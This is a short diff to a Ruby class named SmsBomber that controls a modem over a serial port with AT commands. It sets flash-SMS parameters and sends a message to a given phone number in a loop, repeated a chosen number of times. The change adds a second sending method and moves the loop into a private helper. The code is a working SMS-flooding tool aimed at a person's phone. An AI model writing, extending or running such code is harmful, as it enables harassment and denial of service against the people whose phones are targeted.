@@ -20,6 +20,18 @@ class SmsBomber
     @uart.write('AT+CSMP=17,167,0,16'+13.chr)
     puts 'Setting modem to send class 0 SMS... OK!'
     sleep(2)
+    sendMessage(phoneNumber, smsCount, smsText)
+  end
+  def sendSMS(phoneNumber, smsText, smsCount)
+    @uart.write('AT+CSMP=1,169,0,0'+13.chr)
+    puts 'Setting modem to send class 0 SMS... OK!'
+    sleep(2)
+    sendMessage(phoneNumber, smsCount, smsText)
+  end
+
+
+
+  def sendMessage(phoneNumber, smsCount, smsText)
     (0..smsCount).each do |i|
       print "Sending Message ##{i}"
       @modemBusy=true
@@ -32,7 +44,9 @@ class SmsBomber
       end
     end
   end
+
   def dispose
     Thread.kill @readingThread
   end
+  private :sendMessage
 end
